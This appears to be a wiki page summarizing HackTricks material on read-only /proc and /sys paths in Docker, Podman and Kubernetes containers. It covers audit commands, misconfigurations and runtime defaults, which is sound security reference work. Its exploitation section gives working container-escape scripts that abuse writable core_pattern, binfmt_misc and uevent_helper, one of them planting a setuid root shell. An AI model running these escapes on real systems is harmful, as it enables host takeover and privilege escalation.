---
title: "HackTricks — Read-Only System Paths in Container Environments"
tags: [container-security, procfs, sysfs, privilege-escalation, hacktricks]
sources: [hacktricks-read-only-paths.md]
updated: 2026-05-01
---

# HackTricks — Read-Only System Paths in Container Environments

Source: [HackTricks](../entities/hacktricks.md)

## Key Takeaways

Read-only system paths differ from [masked paths](hacktricks-masked-paths.md): instead of hiding a
path, the runtime exposes it read-only. This allows necessary inspection while preventing writes to
dangerous kernel interfaces. The key targets are `/proc/sys` kernel tunables and kernel helper paths
— when writable, these transition from information disclosure to **host code execution**.

## Default Read-Only Paths (Docker)

```
/proc/sys   /proc/sysrq-trigger   /proc/irq   /proc/bus
```

Check declared vs. actual:

```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```

## High-Value Writable Targets

| Path                                | Impact when writable                                        |
| ----------------------------------- | ----------------------------------------------------------- |
| `/proc/sys/kernel/core_pattern`     | **Host code execution** via crash handler pipe              |
| `/proc/sys/kernel/modprobe`         | Redirect kernel module-loader helper → host exec            |
| `/proc/sys/fs/binfmt_misc/register` | Register custom interpreter → execution on magic-byte match |
| `/proc/sys/vm/panic_on_oom`         | Turn OOM into host-wide kernel panic (DoS)                  |
| `/sys/kernel/uevent_helper`         | Kernel executes helper on uevent → host exec                |

## Exploitation Examples

### core_pattern → host code execution

```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh && chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
# trigger crash → kernel executes shell.sh on host
gcc -o /tmp/crash - <<'C'
int main(void){char buf[1];for(int i=0;i<100;i++)buf[i]=1;return 0;}
C
/tmp/crash && ls -l /tmp/rootsh
```

### binfmt_misc registration

```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht && chmod +x /tmp/test.ht && /tmp/test.ht
cat /tmp/binfmt.out
```

### uevent_helper

```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```

Helper path is resolved from the **host filesystem**, not the container.

## Misconfigurations

- `--privileged` — disables read-only path enforcement
- Writable host `/proc` or `/sys` bind mounts
- `procMount: Unmasked` (Kubernetes)
- Runtime config explicitly relaxing read-only defaults

## Runtime Defaults Table

| Runtime          | Default state             | Common weakening                                                           |
| ---------------- | ------------------------- | -------------------------------------------------------------------------- |
| Docker Engine    | Enabled by default        | Host proc/sys mounts, `--privileged`                                       |
| Podman           | Enabled by default        | `--security-opt unmask=ALL`, broad host mounts, `--privileged`             |
| Kubernetes       | Inherits runtime defaults | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd/CRI-O | OCI/runtime defaults      | Same as Kubernetes row                                                     |

## Related Pages

- [Container Security](../concepts/container-security.md)
- [HackTricks — Masked Paths](hacktricks-masked-paths.md)
- [HackTricks — Sensitive Host Mounts](hacktricks-sensitive-host-mounts.md)
- [HackTricks — Privileged Containers](hacktricks-privileged-containers.md)
- [HackTricks](../entities/hacktricks.md)
